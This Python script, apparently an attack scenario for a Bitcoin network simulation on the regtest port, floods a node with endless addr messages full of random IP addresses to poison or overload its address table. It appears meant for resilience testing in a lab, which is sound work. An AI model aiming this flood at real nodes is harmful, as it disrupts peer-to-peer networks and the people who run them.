#!/usr/bin/env python3
import random
import time

from commander import Commander

from test_framework.messages import CAddress, msg_addr
from test_framework.p2p import P2P_SERVICES, P2PInterface


def cli_help():
    return "Attack a node with addr messages"

class Attack(Commander):
    ip_int = random.randint(0, (1 << 32) - 1)
    sent = 0
    mocktime = int(time.time())

    def set_test_params(self):
        self.num_nodes = 1

    def run_test(self):
        print("Adding p2p connection")
        p = self.nodes[0].add_p2p_connection(
            P2PInterface(), dstaddr=self.nodes[0].rpchost, dstport=18444
        )

        while True:
            addr_msg = self.setup_addr_msg(1000)
            p.send_and_ping(addr_msg)
            time.sleep(0.001)
            self.sent += 1
            if self.sent % 1000 == 0:
                print(f"Sent {self.sent * 1000:,} addresses to {self.nodes[0].rpchost}")
                self.mocktime = int(time.time())
                self.nodes[0].disconnect_p2ps()
                p = self.nodes[0].add_p2p_connection(
                    P2PInterface(), dstaddr=self.nodes[0].rpchost, dstport=18444
                )

    def setup_addr_msg(self, num: int):
        addrs = []
        for _ in range(num):
            addr = CAddress()
            addr.time = self.mocktime
            addr.nServices = P2P_SERVICES
            # Convert ip_int to a string of form "a.b.c.d"
            addr.ip = f"{random.randrange(128,169)}.{random.randrange(1,255)}.{random.randrange(1,255)}.{random.randrange(1,255)}"
            addr.port = 18444
            print(f"Adding addr: {addr.ip}")
            addrs.append(addr)
            self.ip_int = (self.ip_int + 1) & 0xFFFFFFFF

        msg = msg_addr()
        msg.addrs = addrs
        self.mocktime = int(time.time())
        self.ip_int = random.randint(0, (1 << 32) - 1)  # Reset to a new random IP
        return msg

if __name__ == "__main__":
    Attack().main()
